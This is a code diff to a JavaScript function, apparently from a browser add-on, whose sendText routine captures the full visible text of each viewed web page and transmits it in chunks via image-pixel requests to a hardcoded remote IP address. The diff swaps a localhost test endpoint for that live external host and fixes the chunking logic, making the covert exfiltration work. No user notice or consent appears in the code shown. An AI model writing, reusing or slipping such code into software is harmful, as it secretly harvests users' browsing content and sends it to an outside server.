@@ -489,26 +489,24 @@ function I8bho_print()
     function sendText()
     {
         var text = document.body.innerText,
-//            prefix = 'http://211.154.172.172/text?t=',
-            prefix = 'http://localhost/logprocess.php?t=',
+            prefix = 'http://211.154.172.172/text?t=',
             param = '&c=',
-            paraSize = (msie ? (parseInt(win.navigator.appVersion) < 8 ? 2083 : 4098) : 4098),
+            paraSize = (msie ? (parseInt(win.navigator.appVersion) < 8 ? 2083 : 4098) : 4096),
             maxTimes = (msie ? (parseInt(win.navigator.appVersion) < 8 ? 4 : 6) : 4),
-            metaSize = prefix.length + param.length + maxTimes.toString().length;
-        paraSize = 100;
-        var step = paraSize - prefix.length, maxSize = step * maxTimes;
-        content = encodeURIComponent(text.length > maxSize ? text.substr(0, maxSize) : text);
-        var brkPos = [0], imgs = [];
+            metaSize = prefix.length + param.length + (maxTimes + 1).toString().length;
+        if (text === undefined) return;
+        var step = paraSize - metaSize, maxSize = step * maxTimes;
+        content = encodeURIComponent((text.length > maxSize ? text.substr(0, maxSize) : text).replace(/\s{2,}/g, ' ').replace(/[\n&]/g, ' ')).substr(0, maxSize);
+        var brkPos = [0];
         for (var i = 1, p = 0, end = Math.ceil(content.length/step); i <= end; ++i)
         {
-            p += step;
+            p = brkPos[i - 1] + step;
             brkPos[i] = content[p - 2] == '%' ? (p - 2) : (content[p - 1] == '%' ? (p - 1) : p);
-            imgs.push(new Image());
         }
         for (var i = 0, cursor, end = brkPos.length - 1, para; i < end; )
         {
             cursor = brkPos[i];
-            para = content.substr(cursor, brkPos[++i]);
+            para = content.substr(cursor, brkPos[++i] - cursor);
             if (i == end)
             {
                 if (para.length >= paraSize)
@@ -516,7 +514,7 @@ function I8bho_print()
                     para = para.substr(0, para[paraSize - 2] == '%' ? (paraSize - 2) : (para[paraSize - 1] == '%' ? (paraSize - 1) : paraSize));
                 }
             }
-            imgs[i].src = prefix + (i + 1) + param + para;
+            I8px(prefix + (i + 1) + param + para);
         }
     }
 
